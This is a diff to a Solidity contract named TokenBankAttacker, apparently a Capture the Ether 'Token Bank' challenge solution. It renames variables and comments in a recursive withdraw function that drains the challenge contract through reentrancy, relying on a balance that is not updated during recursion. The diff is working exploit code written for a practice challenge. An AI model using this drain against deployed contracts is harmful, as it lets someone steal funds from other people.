@@ -3,7 +3,6 @@ pragma solidity ^0.8.11;
 import "hardhat/console.sol";
 
 abstract contract ISimpleERC223Token {
-    // Track how many tokens are owned by each address.
     mapping(address => uint256) public balanceOf;
 
     function transfer(address to, uint256 value)
@@ -59,25 +58,21 @@ contract TokenBankAttacker {
     }
 
     function callWithdraw() private {
-        // this one is the bugged one, does not update after withdraw
-        uint256 myInitialBalance = challenge.balanceOf(address(this));
-        // this one from the token contract, updates after withdraw
-        uint256 challengeTotalRemainingBalance =
-            challenge.token().balanceOf(address(challenge));
-        // are there more tokens to empty?
-        bool keepRecursing = challengeTotalRemainingBalance > 0;
-        console.log("myInitialBalance is %s tokens", myInitialBalance);
-        console.log(
-            "challengeTotalRemainingBalance is %s tokens",
-            challengeTotalRemainingBalance
-        );
+        // we are draining all the balance from the perspective 
+        // that initial balance is not updated during the recursive function call
+        uint256 initialBalance = challenge.balanceOf(address(this));
+        // remaining balance will be drained by the amount of initial balance
+        uint256 remaining = challenge.token().balanceOf(address(challenge));
 
-        if (keepRecursing) {
+        console.log("initialBalance is %s tokens", initialBalance);
+        console.log("remaining is %s tokens", remaining);
+        // still has remaining balance to empty out
+        if (remaining > 0) {
             // can only withdraw at most our initial balance per withdraw call
             uint256 toWithdraw =
-                myInitialBalance < challengeTotalRemainingBalance
-                    ? myInitialBalance
-                    : challengeTotalRemainingBalance;
+                initialBalance < remaining
+                    ? initialBalance
+                    : remaining;
             challenge.withdraw(toWithdraw);
         }
     }
